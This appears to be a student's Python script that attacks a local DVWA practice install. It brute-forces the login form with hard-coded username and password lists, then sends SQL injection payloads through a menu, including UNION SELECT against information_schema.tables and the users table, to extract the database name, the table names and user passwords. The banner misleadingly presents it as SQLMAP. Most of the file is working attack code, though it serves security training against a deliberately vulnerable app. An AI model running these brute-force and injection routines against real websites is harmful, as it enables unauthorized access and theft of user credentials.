import mechanize
import re
import requests
from requests.utils import requote_uri

print("\n\n**************************************************************************************************")
print("*\t\t\t\t      ------SQLMAP------\t\t\t\t\t *")
print("*\t\t\t\t\t\t\t\t\t\t\t\t *\n* SQLMAP is an open source penetration testing tool on command prompt that automates the process *\n* of detecting and exploiting SQL injection flaws and taking over of database servers.\t\t *")
print("*\t\t\t\t\t\t\t\t\t\t\t\t *\n**************************************************************************************************")


admin_list=['user','','mayirp','rihim','admin','tima','ssb']
pass_list=['user0','abcd@123','pass123','password']

br=mechanize.Browser()
br.set_handle_robots(False)
print("\nChecking Database Admin and Password: -+-+-+-+")
for ad in admin_list:
        for pa in pass_list:
                br.open("http://localhost/DVWA-master/login.php")
                br.select_form(nr=0)
                br["username"]=ad
                br["password"]=pa
                sub=br.submit()
                if sub.geturl()!= 'http://localhost/DVWA-master/login.php':
                        print("\n___________________________\n\n| Password Matched:")
                        print("| Username: ",ad)
                        print("| Password: ",pa)
                        print("___________________________")
                        break
print("\n\n",sub.geturl())
#Security low code
#br.open("http://localhost/DVWA-master/security.php")
#br.select_form(nr=0)
#br["security"] = ["low"]
#sub = br.submit()
#print(sub.read())
#print(sub.geturl())
#Cookies
cookies = br._ua_handlers['_cookies'].cookiejar
# convert cookies into a dict usable by requests
cookie_dict = {}
for c in cookies:
    if c.name == 'security':
        c.value = 'low'
    else:
        cookie_dict[c.name] = c.value
# make a request
print(cookie_dict)

#print(r)
# Get database name  http://localhost/DVWA-master/vulnerabilities/sqli/?id=1%27%20union%20select%20database(),version()--+&Submit=Submit#
# br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
# br.select_form(nr=0)
# br["id"]= "1' union select database(),version()'--+"
# sub=br.submit()
# content = sub.read().decode("utf-8")
# beg = content.rfind('<pre>')
# end = content.rfind('</pre>')
# print("\n__________________________________________DATABASE Name and Version__________________________________________\n")
# print("| ",content[beg:end]," |")





# Get table name  http://localhost/DVWA-master/vulnerabilities/sqli/?id=1%27+union+select+1%2Ctable_name+from+information_schema.tables--+&Submit=Submit#
##br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
##br.select_form(nr=0)
##br["id"]= "1' union select 1,table_name from information_schema.tables'--+"
##sub=br.submit()
##content = sub.read().decode("utf-8")
##print("__________________________________________Tabel Names_____________________")
##beg = [m.start() for m in re.finditer('<pre>',content)]
##end = [m.start() for m in re.finditer('</pre>',content)]
### print(beg,end)
##for i in range(len(beg)):
##        print(content[beg[i]:end[i]])
##

#sql injection code
injects=["1'","'","500' OR 1='1","1' OR 1 = 1 UNION SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#","1' OR 1 = 1 UNION SELECT user, password FROM users#"]

print("\n\n********* MENU *********\n1. Vulnerability check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data from User Table\n6. Exit")
op=int(input("Enter Your Option: "))
while op!=6:
        if op<1 or op>6:
                print("Enter correct input")
                print("********* MENU *********\n1. Vulnerability check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data from User Table\n6. Exit")
                op=int(input("Enter Your Option: "))
                continue
        flag=0
        inj=injects[op-1]
        
        print("Checking ",inj)
        br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
        br.select_form(nr=0)
        br["id"]=inj
        sub=br.submit()
        print(sub.geturl())
        content = sub.read().decode("utf-8")
        #print(content)
        if inj=="'" and "You have an error in your SQL syntax" not in content:
                break
        else:
                print("\n:::::::::       WEBSITE IS SQL VULNERABLE       :::::::::\n")
                flag=1
                if inj =="'":
                        br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
                        br.select_form(nr=0)
                        br["id"]= "' union select database(),version()'--+"
                        sub=br.submit()
                        content = sub.read().decode("utf-8")
                        beg = content.rfind('<pre>')
                        end = content.rfind('</pre>')
                        print("-----------------------------------------DATABASE Name and Version-----------------------------------------")
                        print("| ",content[beg:end]," |")
                        print("-----------------------------------------------------------------------------------------------------------")

        beg = [m.start() for m in re.finditer('<pre>',content)]
        end = [m.start() for m in re.finditer('</pre>',content)]
        # print(beg,end)
        for i in range(len(beg)):
                print("| ",content[beg[i]:end[i]])

        if flag==0:
                print("Not Vulnerable")
        print("______________________________________________________________________________________________________________________________________\n")
        print("\n********* MENU *********\n1. Vulnerability check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data from User Table\n6. Exit")
        op=int(input("Enter Your Option: "))

print("\n Exploitation and detection of SQL vulnerabiities program by:")
print("--------------------------")
print("| Priyam Shah\t 1611107 |\n| Mihir Shah\t 1611118 |\n| Amit Bhujbal\t 1611124 |")
print("--------------------------")